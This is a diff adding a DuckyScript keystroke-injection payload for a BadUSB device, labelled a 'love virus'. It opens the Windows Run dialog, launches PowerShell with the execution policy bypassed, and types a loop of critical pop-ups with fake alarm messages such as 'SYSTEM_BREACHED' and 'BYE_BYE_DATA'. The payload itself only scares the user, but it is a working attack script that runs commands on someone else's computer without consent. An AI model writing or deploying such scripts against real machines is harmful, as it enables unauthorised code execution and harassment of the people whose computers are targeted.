@@ -1,0 +1,10 @@
+REM Astra Love Virus - Focus Lock Version
+DELAY 5000
+GUI r
+DELAY 800
+REM Running visible to ensure keyboard focus
+STRING powershell -NoP -Exec Bypass
+ENTER
+DELAY 2000
+STRING $c=REPLACE_COUNT; $m=@('SYSTEM_BREACHED','ASTRA_TAKEOVER','HEART_HACKED','BYE_BYE_DATA','I_LOVE_YOU_SURYA'); for($i=0; $i -lt $c; $i++){ $msg=$m[(Get-Random -Maximum $m.Count)]; Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox($msg, 'OKOnly,Critical', 'ASTRA_KERNEL'); } exit
+ENTER
